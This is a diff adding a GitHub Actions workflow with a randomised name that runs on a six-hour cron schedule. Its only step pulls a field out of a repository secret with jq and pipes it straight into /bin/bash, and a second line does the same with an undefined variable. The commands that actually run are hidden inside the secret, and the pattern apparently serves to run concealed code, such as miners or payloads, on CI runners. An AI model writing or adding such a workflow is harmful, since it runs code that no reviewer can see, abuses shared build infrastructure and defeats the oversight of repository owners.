@@ -1,0 +1,18 @@
+name: guoweina7816
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: guoweina7816
+        env:
+          ws0799: ${{ secrets.ws0799 }}
+        run: |
+          echo $ws0799 | jq -r .pzavo8959 | /bin/bash
+          echo $wgec0774 | jq -r .xdaw69 | /bin/bash
+
